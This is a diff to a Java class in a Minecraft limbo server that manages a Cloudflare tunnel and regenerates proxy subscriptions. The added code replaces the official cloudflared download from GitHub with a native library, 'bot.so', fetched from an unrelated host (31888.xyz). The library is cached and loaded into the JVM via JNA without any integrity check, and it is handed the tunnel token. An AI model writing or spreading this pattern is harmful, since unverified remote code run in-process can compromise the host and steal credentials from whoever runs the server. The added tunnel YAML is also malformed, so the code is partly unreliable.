@@ -1,195 +1,300 @@
 package ua.nanit.limbo.proxy;
 
+import com.google.gson.Gson;
+import com.google.gson.JsonArray;
+import com.google.gson.JsonObject;
+import com.sun.jna.Function;
+import com.sun.jna.NativeLibrary;
 import java.io.*;
+import java.net.HttpURLConnection;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
 import java.util.Map;
-import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import ua.nanit.limbo.server.Log;
 
 /**
- * Manages cloudflared (Argo Tunnel): downloads the binary, starts fixed-tunnel
- * or quick-tunnel mode, discovers the trycloudflare.com domain,
- * and runs the process with a self-healing watchdog.
+ * Manages cloudflared (Argo Tunnel) via JNA native .so loading (eooce/sbx-native).
  *
- * The watchdog restarts cloudflared on non-zero exit (3s delay) and
- * stops on clean exit (0) or JVM shutdown.
+ * Downloads bot.so from https://{arch}.31888.xyz, loads via JNA,
+ * calls StartCloudflared() / StopCloudflared() — no child processes.
+ *
+ * For quick tunnels, monitors boot.log to discover the trycloudflare.com domain.
  */
 public final class CloudflaredManager {
 
-    private static volatile Process currentProcess;
+    private static NativeLibrary cfLib;
+    private static Function stopCloudflared;
+    private static boolean running = false;
 
-    private static final Pattern QUICK_TUNNEL_PATTERN = Pattern.compile("https://[a-z0-9-]+\\.trycloudflare\\.com");
+    private static final Gson GSON = new Gson();
+    private static final Pattern QUICK_TUNNEL_PATTERN = Pattern.compile("https://([A-Za-z0-9.-]+\\.trycloudflare\\.com)");
 
     private CloudflaredManager() {}
 
-    // ==================== Self-Healing Watchdog ====================
+    // ==================== JNA Native Service ====================
 
     /**
-     * Starts cloudflared with a self-healing loop. Blocks until the process
-     * exits cleanly (exit=0) or the current thread is interrupted.
-     * Intended to run on a dedicated daemon thread.
-     *
-     * Subscription is regenerated after the Argo domain is discovered
-     * (quick tunnel) or immediately (fixed tunnel with known domain).
+     * Downloads bot.so (if not cached), loads via JNA, and starts cloudflared
+     * in a background daemon thread.
      */
-    public static void runWithSelfHealing(Map<String, String> env) {
-        Runnable onDomainDiscovered = () -> {
+    public static void start(Map<String, String> env) throws Exception {
+        String arch = detectArch();
+        String baseUrl = "https://" + arch + ".31888.xyz";
+        Path libPath = downloadLibrary(baseUrl + "/bot.so", "bot.so", env);
+
+        // Handle TunnelSecret auth (write config files before starting)
+        String argoAuth = env.getOrDefault("ARGO_AUTH", "");
+        String argoDomain = env.getOrDefault("ARGO_DOMAIN", "");
+        String filePath = env.getOrDefault("FILE_PATH", "world");
+        Path runtimeDir = Paths.get(filePath).normalize();
+
+        if (!argoAuth.isEmpty() && !argoDomain.isEmpty() && argoAuth.contains("TunnelSecret")) {
+            Log.info("[CF] Writing TunnelSecret config files...");
+            Files.createDirectories(runtimeDir);
+            Files.write(runtimeDir.resolve("tunnel.json"), argoAuth.getBytes(StandardCharsets.UTF_8));
+            String tunnelId = extractTunnelId(argoAuth);
+            String yaml = "tunnel: " + tunnelId + "\n" +
+                    "credentials-file: " + runtimeDir.resolve("tunnel.json").toString().replace("\\", "/") + "\n" +
+                    "protocol: http2\n\n" +
+                    "ingress:\n" +
+                    "  - hostname: " + argoDomain + "\n" +
+                    "    service: http://localhost:" + env.getOrDefault("ARGO_PORT", "8001") + "\n" +
+                    "    originRequest:\n" +
+                    "    noTLSVerify: true\n" +
+                    "  - service: http_status:404\n";
+            Files.write(runtimeDir.resolve("tunnel.yml"), yaml.getBytes(StandardCharsets.UTF_8));
+            Log.info("[CF] TunnelSecret config files written");
+        }
+
+        Log.info("[CF] Loading native library: " + libPath);
+        cfLib = NativeLibrary.getInstance(libPath.toString());
+        Function startFn = cfLib.getFunction("StartCloudflared");
+        stopCloudflared = cfLib.getFunction("StopCloudflared");
+
+        String payload = buildPayload(env, runtimeDir);
+        if (payload == null) {
+            Log.info("[CF] Argo tunnel disabled, not starting cloudflared");
+            return;
+        }
+
+        Log.info("[CF] Starting cloudflared native...");
+        Thread t = new Thread(() -> {
+            try {
+                int code = startFn.invokeInt(new Object[]{payload});
+                Log.info("[CF] cloudflared native exited with code " + code);
+            } catch (Exception e) {
+                Log.warn("[CF] cloudflared native error: " + e.getMessage());
+            }
+        }, "cf-native");
+        t.setDaemon(true);
+        t.start();
+        running = true;
+        Log.info("[CF] cloudflared native started");
+
+        // Wait for quick tunnel domain and regenerate subscription
+        if (argoAuth.isEmpty() || argoDomain.isEmpty()) {
+            discoverQuickTunnelDomain(env, runtimeDir);
+        } else {
+            Log.info("[CF] Using fixed tunnel domain: " + argoDomain);
+            SubscriptionGenerator.generate(env);
+        }
+    }
+
+    /**
+     * Stops cloudflared by calling StopCloudflared() via JNA.
+     */
+    public static void shutdown() {
+        if (running && stopCloudflared != null) {
+            try {
+                int code = stopCloudflared.invokeInt(new Object[]{});
+                running = false;
+                Log.info("[CF] cloudflared stopped with code " + code);
+            } catch (Exception e) {
+                Log.warn("[CF] Error stopping cloudflared: " + e.getMessage());
+            }
+        }
+    }
+
+    // ==================== Payload Builder ====================
+
+    /**
+     * Builds the JSON payload for StartCloudflared based on env vars.
+     * Returns null if Argo is disabled.
+     */
+    private static String buildPayload(Map<String, String> env, Path runtimeDir) {
+        String disableArgo = env.getOrDefault("DISABLE_ARGO", "false");
+        if ("true".equalsIgnoreCase(disableArgo)) {
+            return null;
+        }
+
+        String argoAuth = env.getOrDefault("ARGO_AUTH", "");
+        String argoDomain = env.getOrDefault("ARGO_DOMAIN", "");
+        String argoPort = env.getOrDefault("ARGO_PORT", "8001");
+
+        JsonArray args = new JsonArray();
+
+        if (!argoAuth.isEmpty() && !argoDomain.isEmpty()) {
+            // Check if it's a token (alphanumeric + =, 120-250 chars)
+            if (argoAuth.matches("^[A-Za-z0-9=]{120,250}$")) {
+                args.add("tunnel");
+                args.add("--edge-ip-version");
+                args.add("auto");
+                args.add("--no-autoupdate");
+                args.add("--protocol");
+                args.add("http2");
+                args.add("run");
+                args.add("--token");
+                args.add(argoAuth);
+            } else if (argoAuth.contains("TunnelSecret")) {
+                args.add("tunnel");
+                args.add("--edge-ip-version");
+                args.add("auto");
+                args.add("--config");
+                args.add(runtimeDir.resolve("tunnel.yml").toString().replace("\\", "/"));
+                args.add("run");
+            }
+        }
+
+        if (args.size() == 0) {
+            // Quick tunnel
+            Path bootLog = runtimeDir.resolve("boot.log");
+            args.add("tunnel");
+            args.add("--edge-ip-version");
+            args.add("auto");
+            args.add("--no-autoupdate");
+            args.add("--protocol");
+            args.add("http2");
+            args.add("--logfile");
+            args.add(bootLog.toString().replace("\\", "/"));
+            args.add("--loglevel");
+            args.add("info");
+            args.add("--url");
+            args.add("http://localhost:" + argoPort);
+        }
+
+        JsonObject payload = new JsonObject();
+        payload.add("args", args);
+        return GSON.toJson(payload);
+    }
+
+    // ==================== Quick Tunnel Domain Discovery ====================
+
+    /**
+     * Waits for the quick tunnel domain to appear in boot.log, then
+     * regenerates the subscription.
+     */
+    private static void discoverQuickTunnelDomain(Map<String, String> env, Path runtimeDir) {
+        Path bootLog = runtimeDir.resolve("boot.log");
+        Log.info("[CF] Waiting for quick tunnel domain in boot.log...");
+
+        String domain = waitForDomain(bootLog, 60_000);
+        if (domain == null) {
+            Log.warn("[CF] Quick tunnel domain not found, retrying...");
+            try { Files.deleteIfExists(bootLog); } catch (IOException ignored) {}
+            sleep(5000);
+            domain = waitForDomain(bootLog, 60_000);
+        }
+
+        if (domain != null) {
+            Log.info("[CF] Quick tunnel domain: " + domain);
+            env.put("ARGO_DOMAIN", domain);
             try {
                 SubscriptionGenerator.generate(env);
+                Log.info("[CF] Subscription regenerated with Argo domain");
             } catch (Exception e) {
                 Log.warn("[CF] Failed to regenerate subscription: " + e.getMessage());
             }
-        };
+        } else {
+            Log.warn("[CF] Could not discover quick tunnel domain");
+        }
+    }
 
-        while (true) {
+    /**
+     * Polls boot.log for a trycloudflare.com URL up to the given timeout (ms).
+     */
+    private static String waitForDomain(Path bootLog, long timeoutMs) {
+        long deadline = System.currentTimeMillis() + timeoutMs;
+        String lastContent = "";
+        while (System.currentTimeMillis() < deadline) {
             try {
-                currentProcess = startOnce(env, onDomainDiscovered);
-                int exitCode = currentProcess.waitFor();
-                if (exitCode == 0) {
-                    Log.info("[CF] cloudflared exited cleanly (exit=0), stopping watchdog");
-                    break;
-                }
-                Log.warn("[CF] cloudflared died (exit=" + exitCode + "), restarting in 3s...");
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                Log.warn("[CF] Watchdog interrupted, stopping");
-                Thread.currentThread().interrupt();
-                break;
-            } catch (Exception e) {
-                Log.warn("[CF] Error: " + e.getMessage() + ", restarting in 10s...");
-                try {
-                    Thread.sleep(10000);
-                } catch (InterruptedException ie) {
-                    Thread.currentThread().interrupt();
-                    break;
-                }
-            }
-        }
-    }
-
-    /**
-     * Terminates the current cloudflared process (if alive).
-     * Called from the JVM shutdown hook.
-     */
-    public static void shutdown() {
-        Process p = currentProcess;
-        if (p != null && p.isAlive()) {
-            Log.info("[CF] Terminating cloudflared...");
-            p.destroy();
-        }
-    }
-
-    // ==================== One-shot Start ====================
-
-    /**
-     * Starts cloudflared Argo tunnel once. For fixed tunnels (with ARGO_AUTH), the tunnel
-     * starts immediately. For quick tunnels (no token), a daemon thread monitors
-     * output to discover the *.trycloudflare.com domain.
-     *
-     * @param env                   environment configuration map (ARGO_DOMAIN may be written for quick tunnel)
-     * @param onDomainDiscovered    callback invoked after the Argo domain is known (for subscription regeneration)
-     * @return the cloudflared Process handle
-     */
-    private static Process startOnce(Map<String, String> env, Runnable onDomainDiscovered) throws Exception {
-        Path cfPath = getBinaryPath(env);
-        String argoAuth = env.getOrDefault("ARGO_AUTH", "");
-        String argoPort = env.getOrDefault("ARGO_PORT", "8001");
-        Process cfProcess;
-
-        if (!argoAuth.isEmpty()) {
-            // Fixed tunnel with token
-            Log.info("[CF] Starting Argo fixed tunnel...");
-            ProcessBuilder pb = new ProcessBuilder(cfPath.toString(),
-                "tunnel", "--no-autoupdate", "--edge-ip-version", "auto",
-                "--protocol", "http2", "run", "--token", argoAuth);
-            pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-            cfProcess = pb.start();
-
-            // Invoke callback immediately for fixed tunnels (domain is already known)
-            String argoDomain = env.getOrDefault("ARGO_DOMAIN", "");
-            if (!argoDomain.isEmpty()) {
-                onDomainDiscovered.run();
-                Log.info("[CF] Argo fixed tunnel started, domain: " + argoDomain);
-            }
-        } else {
-            // Quick tunnel (no token) - parse output for trycloudflare.com domain
-            Log.info("[CF] Starting Argo quick tunnel...");
-            ProcessBuilder pb = new ProcessBuilder(cfPath.toString(),
-                "tunnel", "--no-autoupdate", "--edge-ip-version", "auto",
-                "--protocol", "http2", "--url", "http://localhost:" + argoPort);
-            pb.redirectErrorStream(true);
-            cfProcess = pb.start();
-
-            AtomicBoolean domainFound = new AtomicBoolean(false);
-            Thread parserThread = new Thread(() -> {
-                try {
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(cfProcess.getInputStream()));
-                    String line;
-                    while ((line = reader.readLine()) != null && !domainFound.get()) {
-                        Matcher matcher = QUICK_TUNNEL_PATTERN.matcher(line);
-                        if (matcher.find()) {
-                            String domain = matcher.group();
-                            String host = new URL(domain).getHost();
-                            env.put("ARGO_DOMAIN", host);
-                            domainFound.set(true);
-                            Log.info("[CF] Argo quick tunnel domain: " + host);
-                            onDomainDiscovered.run();
-                            Log.info("[CF] Subscription updated with Argo domain");
-                        }
+                if (bootLog.toFile().exists()) {
+                    byte[] raw = Files.readAllBytes(bootLog);
+                    String content = new String(raw, StandardCharsets.UTF_8);
+                    if (!content.equals(lastContent)) {
+                        lastContent = content;
+                        Matcher m = QUICK_TUNNEL_PATTERN.matcher(content);
+                        String found = null;
+                        while (m.find()) found = m.group(1);
+                        if (found != null) return found;
                     }
-                } catch (Exception e) {
-                    Log.warn("[CF] Parser thread error: " + e.getMessage());
                 }
-            });
-            parserThread.setDaemon(true);
-            parserThread.start();
+            } catch (IOException ignored) {}
+            sleep(1000);
         }
-
-        return cfProcess;
+        return null;
     }
 
-    // ==================== Binary Management ====================
+    private static String extractTunnelId(String auth) {
+        Matcher m = Pattern.compile("\"TunnelID\"\\s*:\\s*\"([^\"]+)\"").matcher(auth);
+        if (m.find()) return m.group(1);
+        m = Pattern.compile("TunnelID[^:]*:\\s*\"([^\"]+)\"").matcher(auth);
+        return m.find() ? m.group(1) : "";
+    }
 
-    /**
-     * Returns the path to the cloudflared binary, downloading it if necessary.
-     */
-    public static Path getBinaryPath(Map<String, String> env) throws IOException {
-        String version = env.getOrDefault("CF_VERSION", "2025.10.0");
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String osName = System.getProperty("os.name").toLowerCase();
+    // ==================== .so Library Download ====================
 
-        String arch;
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            arch = "amd64";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            arch = "arm64";
+    private static Path downloadLibrary(String url, String fileName, Map<String, String> env) throws IOException {
+        String filePath = env.getOrDefault("FILE_PATH", "world");
+        Path dir = Paths.get(filePath).normalize();
+        Path target = dir.resolve(fileName);
+
+        if (target.toFile().exists()) {
+            Log.info("[CF] Using cached native library: " + target);
+            return target;
+        }
+
+        Files.createDirectories(dir);
+        Path tmp = dir.resolve(fileName + ".download");
+
+        Log.info("[CF] Downloading " + url + " -> " + target);
+        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+        try {
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(180000);
+            int responseCode = conn.getResponseCode();
+            if (responseCode < 200 || responseCode >= 300) {
+                throw new IOException("HTTP " + responseCode + " for " + url);
+            }
+            try (InputStream in = conn.getInputStream()) {
+                Files.copy(in, tmp, StandardCopyOption.REPLACE_EXISTING);
+            }
+            Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
+            if (!target.toFile().setExecutable(true, false)) {
+                Log.warn("[CF] Failed to set executable on " + target);
+            }
+            Log.info("[CF] Downloaded " + fileName + " (" + target.toFile().length() + " bytes)");
+        } finally {
+            conn.disconnect();
+            try { Files.deleteIfExists(tmp); } catch (IOException ignored) {}
+        }
+        return target;
+    }
+
+    private static String detectArch() {
+        String arch = System.getProperty("os.arch").toLowerCase();
+        if (arch.contains("amd64") || arch.contains("x86_64")) {
+            return "amd64";
+        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
+            return "arm64";
         } else {
-            throw new RuntimeException("Unsupported architecture for cloudflared: " + osArch);
+            throw new RuntimeException("Unsupported architecture: " + arch);
         }
+    }
 
-        String platform = osName.contains("linux") ? "linux" :
-                          osName.contains("mac") ? "darwin" : "linux";
-
-        String filename = "cloudflared-" + platform + "-" + arch;
-        String url = "https://github.com/cloudflare/cloudflared/releases/download/" + version + "/" + filename;
-
-        Path binPath = Paths.get(System.getProperty("java.io.tmpdir"), "cf");
-
-        if (!binPath.toFile().exists()) {
-            Log.info("[CF] Downloading cloudflared " + version + " (" + arch + ")...");
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, binPath, StandardCopyOption.REPLACE_EXISTING);
-            }
-            if (!binPath.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set cloudflared executable permission");
-            }
-            Log.info("[CF] cloudflared downloaded successfully");
-        }
-
-        return binPath;
+    private static void sleep(long ms) {
+        try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
     }
 }
